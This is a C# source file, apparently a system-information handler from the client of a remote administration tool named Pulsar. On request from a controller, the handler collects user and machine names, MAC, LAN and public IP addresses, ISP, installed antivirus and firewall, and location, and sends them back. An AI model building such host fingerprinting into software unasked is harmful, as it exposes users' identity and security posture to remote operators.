using Pulsar.Client.Helper;
using Pulsar.Client.IpGeoLocation;
using Pulsar.Client.User;
using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.NetworkInformation;
using Pulsar.Client.IO;
using Pulsar.Common.Messages.Administration.SystemInfo;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Client.Messages
{
    public class SystemInformationHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetSystemInfo;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetSystemInfo msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetSystemInfo message)
        {
            try
            {
                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";

                var geoInfo = GeoInformationFactory.GetGeoInformation();
                var userAccount = new UserAccount();
                string defaultBrowser = SystemHelper.GetDefaultBrowser();

                List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                {
                    new Tuple<string, string>("处理器 (CPU)", HardwareDevices.CpuName),
                    new Tuple<string, string>("内存 (RAM)", $"{HardwareDevices.TotalPhysicalMemory} MB"),
                    new Tuple<string, string>("显卡 (GPU)", HardwareDevices.GpuNames),
                    new Tuple<string, string>("用户名", userAccount.UserName),
                    new Tuple<string, string>("计算机名", SystemHelper.GetPcName()),
                    new Tuple<string, string>("域名", domainName),
                    new Tuple<string, string>("主机名", hostName),
                    new Tuple<string, string>("系统盘", Path.GetPathRoot(Environment.SystemDirectory)),
                    new Tuple<string, string>("系统目录", Environment.SystemDirectory),
                    new Tuple<string, string>("运行时间", SystemHelper.GetUptime()),
                    new Tuple<string, string>("MAC 地址", HardwareDevices.MacAddress),
                    new Tuple<string, string>("局域网 IP", HardwareDevices.LanIpAddress),
                    new Tuple<string, string>("公网 IP", geoInfo.IpAddress),
                    new Tuple<string, string>("ASN", geoInfo.Asn),
                    new Tuple<string, string>("ISP", geoInfo.Isp),
                    new Tuple<string, string>("杀毒软件", SystemHelper.GetAntivirus()),
                    new Tuple<string, string>("防火墙", SystemHelper.GetFirewall()),
                    new Tuple<string, string>("时区", geoInfo.Timezone),
                    new Tuple<string, string>("国家/地区", geoInfo.Country),
                    new Tuple<string, string>("默认浏览器", defaultBrowser)
                };

                client.Send(new GetSystemInfoResponse { SystemInfos = lstInfos });
            }
            catch
            {
            }
        }
    }
}
